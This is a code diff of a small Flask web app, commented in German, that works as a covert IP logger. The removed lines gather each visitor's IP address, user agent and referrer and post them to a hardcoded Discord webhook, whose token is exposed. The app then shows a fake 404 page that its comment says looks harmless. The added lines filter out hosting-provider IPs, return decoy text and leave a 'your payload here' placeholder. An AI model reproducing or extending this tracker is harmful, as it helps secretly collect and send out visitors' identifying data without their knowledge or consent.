@@ -1,63 +1,27 @@
 from flask import Flask, request
-import requests
-import json
 import os
 
 app = Flask(__name__)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1527305360539517031/X78P4aN1u9gSLbo9mAHZkaDQTNJN-boj4e8eabaARIAFhVMgEw-1YZVpXNXeJxgQNGqQ"
+@app.before_request
+def block_internal():
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if ip and ip.startswith(('127.', '10.', '172.16.', '192.168.', '34.82.')):  # Render-Bereich blocken
+        if '/health' not in request.path:  # Falls du Health-Check hast
+            return "OK", 200  # Silent für interne
 
-def get_client_ip(request):
-    # Alle möglichen Header durchgehen
-    headers = [
-        'X-Forwarded-For',
-        'X-Real-IP',
-        'CF-Connecting-IP',  # Falls Cloudflare
-        'True-Client-IP'
-    ]
-    for header in headers:
-        value = request.headers.get(header)
-        if value:
-            ip = value.split(',')[0].strip()
-            if ip and not ip.startswith(('10.', '172.16.', '192.168.', '127.')):
-                return ip
-    return request.remote_addr or 'Unknown'
-
+# Dann deine normale Route
 @app.route('/')
 def log_ip():
-    ip = get_client_ip(request)
-    # ... rest wie vorher
+    # Nur echte externe IPs loggen
     forwarded = request.headers.get('X-Forwarded-For')
-    if forwarded:
-        ips = [x.strip() for x in forwarded.split(',')]
-        ip = ips[0]  # Erste ist meist der echte Client
+    ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
     
-    if not ip or ip.startswith('10.') or ip.startswith('172.16.') or ip.startswith('192.168.') or ip == '127.0.0.1':
-        ip = request.remote_addr  # Fallback
+    # Filtere Render-IPs raus
+    if ip.startswith(('34.82.', '127.')):
+        return "URL NOT FOUND PLEASE VISIT: https://gengaog/github.io/-/", 200  # Kein Log für interne Requests
     
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    referrer = request.headers.get('Referer', 'None')
-    
-    payload = {
-        "content": f"🌐 **Neuer Besucher**\n**IP:** `{ip}`",
-        "embeds": [{
-            "title": "IP Logger",
-            "color": 16711680,
-            "fields": [
-                {"name": "IP", "value": f"`{ip}`", "inline": True},
-                {"name": "User-Agent", "value": f"`{user_agent[:300]}`", "inline": False},
-                {"name": "Referrer", "value": f"`{referrer}`", "inline": False},
-            ]
-        }]
-    }
-    
-    try:
-        requests.post(WEBHOOK_URL, json=payload, timeout=15)
-    except Exception as e:
-        pass  # Silent fail
-    
-    return "<h1>404 Not Found</h1>", 404  # Sieht harmloser aus
-
+    # ... dein Payload hier mit dem gefilterten ip ...
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
